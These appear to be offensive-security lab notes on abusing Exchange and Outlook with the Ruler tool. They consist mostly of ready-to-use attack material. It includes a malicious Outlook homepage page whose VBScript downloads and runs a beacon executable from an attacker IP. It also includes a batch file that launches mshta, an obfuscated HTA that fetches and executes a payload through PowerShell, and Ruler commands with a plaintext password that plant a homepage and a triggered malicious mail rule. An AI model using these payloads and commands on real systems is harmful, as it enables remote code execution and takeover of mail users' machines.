# Ruler (Exchange)

Ruler has been tested against the following systems:

* Exchange 2003
* Exchange 2013
* Exchange 2013 SP1
* Exchange 2016
* Office365

The following Outlook clients have been tested:

* Outlook 2010
* Outlook 2013
* Outlook 2016 (Only [Forms](https://github.com/sensepost/ruler/wiki/Forms) work by default)

```html
# test.html
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Outlook</title>
<script id=clientEventHandlersVBS language=vbscript>
Sub window_onload()
Set Application = ViewCtl1.OutlookApplication
Set cmd = Application.CreateObject("Wscript.Shell")
cmd.Run("powershell wget http://10.10.14.6/beacon.exe -Outfile
C:\\Windows\\Tasks\\beacon.exe;C:\\Windows\\Tasks\\beacon.exe")
End Sub
</script>
</head>
<body>
<h1> Hello Alex </h1>
<object classid="clsid:0006F063-0000-0000-C000-000000000046"
id="ViewCtl1" data="" width="100%" height="100%"></object>
</body>
</html>
```

```batch
# Evil.bat
@ECHO OFF
cmd /c "C:\Windows\System32\mshta.exe http://10.10.14.7/evil.hta"
```

```xml
# evil.hta
<script %00 >
zeroo=ActiveXObject;
SRpT="WScript"
steUyo=SRpT + ".Shell"
one=new zeroo(steUyo);
one.run('%windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -exec
bypass -C "wget http://10.10.14.7/beacon.exe -outfile
C:\\Windows\\Tasks\\beacon.exe;C:\\Windows\\Tasks\\beacon.exe"' ,
0);window.close();
</script %00 >
```

### Commands

```
upload https://github.com/sensepost/ruler/releases/download/2.4.1/ruler-win64.exe
/opt/exegol-resources/linux/webdav go run webdavserv.go -p 8080    
/opt/exegol-resources/linux/webdav//webdav python3 -m http.server 80
```

#### Create Endpoint

```bash
shell ruler-win64.exe -u Robert.Lanza -p U=zk1J.TYruU* -e robert.lanza@cyber.local -d CYBER.local --insecure homepage add -u http://10.10.14.177/webdav/test.html
```

#### Check

```bash
shell ruler-win64.exe -u Robert.Lanza -p U=zk1J.TYruU* -e robert.lanza@cyber.local -d CYBER.local homepage display
```

#### Adding Rule

```bash
shell ruler-win64.exe --email robert.lanza@cyber.local --username robert.lanza --password U=zk1J.TYruU* add --location "\\10.10.14.177@8080\webdav\evil.bat" --trigger "pwn" --name maliciousrule2 --send
```
